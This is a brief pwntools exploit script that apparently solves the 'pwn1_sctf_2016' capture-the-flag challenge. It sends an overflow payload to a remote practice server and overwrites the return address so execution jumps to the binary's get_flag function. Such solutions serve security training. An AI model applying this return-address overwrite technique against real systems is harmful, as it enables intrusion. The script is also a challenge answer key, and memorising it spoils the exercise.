from pwn import *
io = remote("node5.buuoj.cn",28287)
elf = ELF("./pwn1_sctf_2016")
system_addr = elf.symbols["get_flag"]
#system_addr = 0x08048F13
payload = b'I'*21+b'a'+p64(system_addr)
io.sendline(payload)
io.interactive()

